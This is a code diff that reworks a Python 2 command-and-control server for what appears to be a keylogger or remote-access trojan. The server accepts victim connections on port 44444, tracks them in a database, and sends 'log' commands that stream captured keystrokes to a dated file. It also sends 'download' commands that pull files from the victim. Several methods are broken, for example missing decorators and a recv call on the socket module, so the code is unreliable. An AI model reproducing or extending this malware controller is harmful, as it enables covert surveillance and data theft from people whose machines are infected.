@@ -2,138 +2,111 @@ from __future__ import print_function
 import socket
 import datetime
 import threading
-import sys
+from Tkinter import END, NORMAL
+import db
+import Connection
 
+class Server:
 
-def newConn(c, addr):
-    while (True):
-        try:
-            c.getpeername()
-        except:
-            ip = findClientBySocket(c)
-            hostname = findClient(c)[3]
-            sys.stdout.write(str(ip) + "/" + hostname + " has disconnected...\n>")
-            sys.stdout.flush()
-            return;
+    def __init__(self, b):
+        global box
+        box = b
+        return
 
+    def getIP(f):
+        s = socket.socket()
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(('google.com', 0))
+        host = s.getsockname()[0]
+        s.close()
+        return host
 
-def getIP():
+    port = 44444
+    box = None
+    print(box)
     s = socket.socket()
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(('google.com', 0))
-    host = s.getsockname()[0]
-    s.close()
-    return host
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((getIP("d"), port))
+    s.listen(5)
+    DB = db.DB()
+
+    @staticmethod
+    def newConn(nc):
+        while (True):
+            try:
+                nc.socket.getpeername()
+            except:
+                ip = nc.ip
+                hostname = nc.hostname
+                Server.updateTextbox(str(ip) + "/" + hostname + " has disconnected...\n")
+                return
+
+    @staticmethod
+    def trimMessage(m):
+        newM = m.split('\x00')[0]
+        return newM
+
+    @staticmethod
+    def waitForConns():
+        Server.updateTextbox("Waiting for connections...\n")
+        while (True):
+            global s
+            c, addr = Server.s.accept()
+            hostname = Server.trimMessage(c.recv(256))
+            nc = Connection.Connection(addr, hostname, c)
+            Server.DB.insert(nc)
+            t = threading.Thread(target=Server.newConn, args=[nc])
+            t.setDaemon(True)
+            t.start()
+
+    @staticmethod
+    def printClients():
+        Server.updateTextbox("Here are the clients you have:")
+        darr = Server.DB.getAllConnectionsPrint()
+        for i in darr:
+            Server.updateTextbox(str(i["hostname"] + ": " + str(i["ip"])))
+
+    @staticmethod
+    def updateTextbox(s):
+        box.config(state=NORMAL)
+        box.insert(END, s)
+
+    def keyLog(conn):
+        conn.socket.sendall("log")
+        Server.recvKeyLogs(conn)
 
 
-def findClientBySocket(socket):
-    for i in range(0, len(clientList)):
-        if (socket == clientList[i][0]):
-            return clientList[i][1][0]
-
-    print("Socket could not be matched to client")
-
-
-def findClient(socket):
-    for i in xrange(len(clientList)):
-        if (socket == clientList[i][0]):
-            return clientList[i]
-        else:
-            print("socket not found...")
+    def recvKeyLogs(conn):
+        host = Server.DB.findBySock(conn.socket)
+        date = str(datetime.date.today())
+        f = open(date+'_keys.txt', 'w')
+        while (True):
+            key = socket.recv(512)
+            f.write(key)
+            print(key[0][0])
 
 
-def findSocketById(iD):
-    for i in xrange(len(clientList)):
-        if (int(iD) == clientList[i][2]):
-            return clientList[i][0]
-        else:
-            print(str(iD) + " not found...")
+    def whatDo(cmd):
+        conn = Server.DB.getConnectionHostIP(cmd[0].ip, cmd[0].hostname)
+        if (cmd[1] == "log"):
+            Server.keyLog(conn)
+        elif ("list" in cmd[1]):
+            Server.printClients()
+        elif ("download" in cmd[1]):
+            Server.downloadFile(conn)
 
 
-port = 44444
-s = socket.socket()
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind((getIP(), port))
-s.listen(5)
-clientList = []
-Id = 0
+    def downloadFile(socket):
+        socket.send("send")
+        f = open("test.jpg", "w")
+        while (True):
+            line = socket.recv(1024)
+            print(line)
+            f.write(line)
 
 
-def trimMessage(m):
-    newM = m.split('\x00')[0]
-    return newM
-
-
-def waitForConns():
-    print("Waiting for connections...\n")
-    while (True):
-        c, addr = s.accept()
-        hostname = trimMessage(c.recv(256))
-        global Id
-        Id = Id + 1
-        iD = Id
-        clientList.append([c, addr, iD, hostname])
-        t = threading.Thread(target=newConn, args=[c, addr])
+    def startServer(self):
+        t = threading.Thread(target=Server.waitForConns)
         t.setDaemon(True)
         t.start()
-
-
-def printClients():
-    print("Here are the clients you have:")
-    for i in range(0, len(clientList)):
-        print(str(clientList[i][2]) + ". " + str(clientList[i][1][0]))
-
-
-def keyLog(socket):
-    socket.sendall("log")
-    recvKeyLogs(socket)
-
-
-def recvKeyLogs(socket):
-    host = findClient(socket)[3]
-    date = str(datetime.date.today())
-    f = open('keys.txt', 'w')
-    while (True):
-        key = socket.recv(512)
-        f.write(key)
-        print(key[0][0])
-
-
-def whatDo(iD, cmd):
-    socket = findSocketById(iD)
-    if (cmd == "log"):
-        keyLog(socket)
-    elif ("list" in cmd):
-        printClients()
-    elif ("download" in cmd):
-        downloadFile(socket)
-
-
-def getUserCmd():
-    while (True):
-        if (len(clientList) > 0):
-            cmd = raw_input(">")
-            if (cmd == ""):
-                print("enter command")
-                continue
-            cmd = cmd.lower().split()
-            whatDo(cmd)
-
-
-def downloadFile(socket):
-    socket.send("send")
-    f = open("test.jpg", "w")
-    while (True):
-        line = socket.recv(1024)
-        print(line)
-        f.write(line)
-
-
-def main():
-    t = threading.Thread(target=waitForConns)
-    t.setDaemon(True)
-    t.start()
-    getUserCmd()
-
-
-main()
